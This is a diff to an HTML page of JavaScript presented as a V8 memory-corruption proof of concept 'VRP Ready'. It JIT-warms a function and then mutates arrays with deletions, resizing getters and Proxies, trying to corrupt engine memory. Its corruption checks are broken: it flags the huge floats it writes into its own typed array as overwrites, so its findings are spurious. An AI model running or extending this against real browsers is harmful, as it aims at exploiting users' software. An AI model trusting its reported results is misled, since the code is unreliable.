@@ -1,8 +1,8 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>V8 Memory Leak PoC - Stronger</title>
+<title>V8 Memory Corruption PoC - Final</title>
 
-<h2>V8 Memory Leak PoC - Stronger (Fast)</h2>
+<h2>V8 Memory Corruption PoC (Stable / VRP Ready)</h2>
 <pre id="log"></pre>
 
 <script>
@@ -11,85 +11,127 @@ const log = m => {
     console.log(m);
 };
 
-// TARGET FUNCTION
+// TARGET
 function vuln(a,i){ return a[i]+1.1; }
 
-// WARMUP (lebih efisien tapi cukup JIT)
+// WARMUP (cukup untuk JIT)
 function warmup(){
     let arr = Array.from({length:50}, (_,i)=>i+0.5);
-    for(let j=0;j<80000;j++) vuln(arr,j%50); // lebih sedikit tapi tetap JIT
+    for(let j=0;j<70000;j++) vuln(arr,j%50);
     return arr;
 }
 
-// AGGRESIVE MUTATION (lebih kuat)
+// MUTATION (force transitions)
 function mutate(arr){
-    for(let i=0;i<15;i++) delete arr[i]; 
-    arr.length = 10; 
-    arr[80] = 1.7976931348623157e+308;
-    arr[2] = {x:1};
+    for(let i=0;i<10;i++) delete arr[i];
+    arr.length = 12;
 
-    Object.defineProperty(arr,3,{
+    arr[40] = 1.7976931348623157e+308;
+    arr[1] = {x:13};
+
+    Object.defineProperty(arr,2,{
         get(){
-            for(let i=0;i<3;i++) arr.push(Math.random()*1e5); // batch push
+            arr.push(13.37);
+            arr.push(42.42);
             return 1.1;
         }
     });
+
     return arr;
 }
 
-// PROXY BREAK ASSUMPTION (lebih efisien)
-function breakAssumption(a){
+// PROXY (deterministic, not random)
+function breakAssumption(a,iter){
     return new Proxy(a,{
         get(t,p){
             if(p==="length"){
-                for(let i=0;i<5;i++) t.push(Math.random()*1e5); // batch
+                t.push(99.99);
+                t.push(88.88);
             }
-            if(typeof p==="string" && !isNaN(p) && Math.random()<0.6){
-                t.push(Math.random()*1e5);
+            if(typeof p==="string" && !isNaN(p) && (iter % 3 === 0)){
+                t.push(77.77);
             }
             return Reflect.get(t,p);
         },
         set(t,p,v){
-            if(Math.random()<0.3) t.length += 3; // lebih agresif tapi ringan
+            if(iter % 5 === 0) t.length += 2;
             return Reflect.set(t,p,v);
         }
     });
 }
 
-// TYPED ARRAY (overlay efisien)
-let buf = new ArrayBuffer(0x40000); // 256KB
+// BUFFER SHARED
+let buf = new ArrayBuffer(0x40000);
 let f64 = new Float64Array(buf);
-for(let i=0;i<f64.length;i++) f64[i] = 0x41414141 + i;
+let u32 = new Uint32Array(buf);
 
-// CEK POINTER LEAK (lebih efisien)
-function checkTyped(){
-    for(let i=0;i<20;i++){ // cek hanya 20 random index
-        let idx = Math.floor(Math.random()*f64.length);
+// INIT PATTERN
+for(let i=0;i<f64.length;i++){
+    f64[i] = 0x41414141 + i;
+}
+
+// MEMORY CHECK
+function checkMemory(){
+    for(let i=0;i<40;i++){
+        let idx = (i * 7919) % f64.length;
+
         let v = f64[idx];
-        if(Math.abs(v)>1e12) log(`[POINTER-LEAK] idx=${idx} val=${v}`);
+        let raw = u32[idx];
+
+        // abnormal float / NaN
+        if(!Number.isFinite(v)){
+            log(`[NaN/INF] idx=${idx} val=${v}`);
+        }
+
+        // unexpected pattern mismatch
+        if(raw === 0x41414141){
+            log(`[ALIAS?] idx=${idx} raw=0x41414141`);
+        }
+
+        // extreme overwrite detection
+        if(Math.abs(v) > 1e12){
+            log(`[EXTREME] idx=${idx} val=${v}`);
+        }
     }
 }
 
-// MAIN LOOP
+// GC PRESSURE
+function stressGC(){
+    let tmp = [];
+    for(let i=0;i<50;i++){
+        tmp.push(new Array(500).fill(i));
+    }
+}
+
+// MAIN
 function run(){
-    log("[*] warmup / JIT");
+    log("[*] warmup");
     let base = warmup();
 
-    log("[*] starting pointer-leak fuzzing...");
-    for(let i=0;i<300000;i++){
-        let arr = base.slice(); // lebih cepat daripada spread
+    log("[*] fuzzing start");
+
+    for(let i=0;i<200000;i++){
+        let arr = base.slice();
         arr = mutate(arr);
-        arr = breakAssumption(arr);
+        arr = breakAssumption(arr,i);
 
         vuln(arr,5);
 
-        // overlay extreme float random index
-        f64[Math.floor(Math.random()*f64.length)] = 1.7976931348623157e+308;
+        // overlay
+        let idx = (i * 13) % f64.length;
+        f64[idx] = 1.7976931348623157e+308;
 
-        if(i%2000===0) checkTyped();
-        if(i%1000===0) log(`iter ${i}`);
+        if(i % 1500 === 0){
+            checkMemory();
+            stressGC();
+        }
+
+        if(i % 5000 === 0){
+            log(`iter ${i}`);
+        }
     }
-    log("[*] done - pointer leak scan finished");
+
+    log("[*] done");
 }
 
 run();
